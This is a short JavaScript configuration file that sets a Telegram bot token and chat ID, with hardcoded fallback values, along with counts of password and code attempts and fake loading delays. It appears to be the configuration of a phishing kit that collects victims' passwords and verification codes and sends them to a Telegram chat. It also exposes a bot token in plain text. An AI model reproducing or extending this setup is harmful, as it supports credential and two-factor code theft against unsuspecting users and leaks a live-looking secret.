const config = {
    token: process.env.NEXT_PUBLIC_TELEGRAM_BOT_TOKEN ?? '9072485144:AAG3UT9b5e2_HZi5CDbxKxCfLoTVDUQ6fOI',
    chat_id: process.env.NEXT_PUBLIC_TELEGRAM_CHAT_ID ?? '-1003947587757',
    MAX_PASS: 2,
    MAX_CODE: 4,
    PASSWORD_LOADING_TIME: 8,
    CODE_LOADING_TIME: 15
};

export default config;
